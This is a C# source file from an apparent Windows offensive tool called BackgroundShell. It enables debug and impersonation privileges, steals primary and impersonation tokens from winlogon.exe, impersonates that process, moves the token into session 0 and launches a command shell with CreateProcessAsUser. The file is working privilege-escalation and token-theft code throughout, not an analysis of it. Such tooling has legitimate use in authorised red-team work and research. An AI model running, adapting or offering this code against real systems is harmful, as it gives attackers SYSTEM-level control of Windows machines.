using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using BackgroundShell.Interop;

namespace BackgroundShell.Library
{
    internal class Modules
    {
        public static bool GetBackgroundShell()
        {
            IntPtr hPrimaryToken;
            var hImpersonationToken = IntPtr.Zero;
            var requiredPrivs = new List<SE_PRIVILEGE_ID>
            {
                SE_PRIVILEGE_ID.SeDebugPrivilege,
                SE_PRIVILEGE_ID.SeImpersonatePrivilege
            };
            bool bSuccess = Helpers.EnableTokenPrivileges(
                in requiredPrivs,
                out Dictionary<SE_PRIVILEGE_ID, bool> privStates);

            foreach (var state in privStates)
            {
                if (state.Value)
                    Console.WriteLine("[+] {0} is enabled successfully.", state.Key.ToString());
                else
                    Console.WriteLine("[-] Failed to enable {0}.", state.Key.ToString());
            }

            if (!bSuccess)
            {
                Console.WriteLine("[-] Failed to enable required privileges (Error = 0x{0}).",
                    Marshal.GetLastWin32Error().ToString("X8"));
                return false;
            }

            do
            {
                int nCurrentSessionId;
                var dupTokenPrivs = new List<SE_PRIVILEGE_ID>
                {
                    SE_PRIVILEGE_ID.SeAssignPrimaryTokenPrivilege,
                    SE_PRIVILEGE_ID.SeTcbPrivilege,
                    SE_PRIVILEGE_ID.SeIncreaseQuotaPrivilege
                };
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                    wShowWindow = SHOW_WINDOW_FLAGS.SW_SHOW,
                    lpDesktop = @"Winsta0\Default"
                };
                hPrimaryToken = Helpers.GetWinlogonToken(TOKEN_TYPE.Primary);

                if (hPrimaryToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to duplicate primary token from winlogon.exe (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    NativeMethods.NtClose(hImpersonationToken);
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a primary token from winlogon.exe (Handle = 0x{0}).",
                        hPrimaryToken.ToString("X"));
                }

                hImpersonationToken = Helpers.GetWinlogonToken(TOKEN_TYPE.Impersonation);

                if (hImpersonationToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to duplicate impersonation token from winlogon.exe (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a impersonation token from winlogon.exe (Handle = 0x{0}).",
                        hImpersonationToken.ToString("X"));
                }

                nCurrentSessionId = Helpers.GetTokenSessionId(hPrimaryToken);

                if (nCurrentSessionId == -1)
                {
                    Console.WriteLine("[-] Failed to get current session ID (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Current session ID is {0}.", nCurrentSessionId);
                }

                bSuccess = Helpers.EnableTokenPrivileges(
                    hImpersonationToken,
                    in dupTokenPrivs,
                    out privStates);

                if (!bSuccess)
                {
                    foreach (var state in privStates)
                    {
                        if (!state.Value)
                            Console.WriteLine("[-] Failed to enable {0}.", state.Key.ToString());
                    }

                    break;
                }

                bSuccess = Helpers.ImpersonateThreadToken(new IntPtr(-2), hImpersonationToken);
                NativeMethods.NtClose(hImpersonationToken);
                hImpersonationToken = IntPtr.Zero;

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to impersonate as winlogon.exe (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Impersonation as winlogon.exe is successful.");
                }

                if (nCurrentSessionId != 0)
                {
                    bSuccess = Helpers.SetTokenSessionId(hPrimaryToken, 0);

                    if (!bSuccess)
                    {
                        Console.WriteLine("[-] Failed to update token session ID (Error = 0x{0}).",
                            Marshal.GetLastWin32Error().ToString("X8"));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[+] Token session ID is updated from {0} to 0 successfully.",
                            nCurrentSessionId);
                    }
                }

                bSuccess = NativeMethods.CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    Environment.GetEnvironmentVariable("COMSPEC"),
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_BREAKAWAY_FROM_JOB,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);
                NativeMethods.NtClose(hPrimaryToken);
                hPrimaryToken = IntPtr.Zero;

                if (bSuccess)
                {
                    NativeMethods.NtWaitForSingleObject(
                        processInfo.hThread,
                        false,
                        IntPtr.Zero);
                    NativeMethods.NtClose(processInfo.hThread);
                    NativeMethods.NtClose(processInfo.hProcess);
                }
                else
                {
                    Console.WriteLine("[-] Failed to execute shell (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                }
            } while (false);

            if (hPrimaryToken != IntPtr.Zero)
                NativeMethods.NtClose(hPrimaryToken);

            if (hImpersonationToken != IntPtr.Zero)
                NativeMethods.NtClose(hImpersonationToken);

            return bSuccess;
        }
    }
}
